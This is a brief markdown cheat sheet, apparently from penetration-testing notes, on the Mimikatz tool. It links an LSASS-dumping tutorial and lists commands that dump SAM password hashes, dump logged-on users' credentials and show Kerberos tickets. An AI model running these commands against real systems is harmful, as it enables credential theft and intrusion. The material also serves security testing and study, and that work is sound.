# Mimikatz

## Readings

* Dump LSASS process and load it into Mimikatz: [http://www.fuzzysecurity.com/tutorials/18.html](http://www.fuzzysecurity.com/tutorials/18.html)

## Examples

Dump password hashes

```
privilege::debug
token::elevate
lsadump::sam
```

Dump credentials of logged-on users

```
privilege::debug
sekurlsa::logonpasswords
```

Show Kerberos tickets

```
sekurlsa::tickets
```
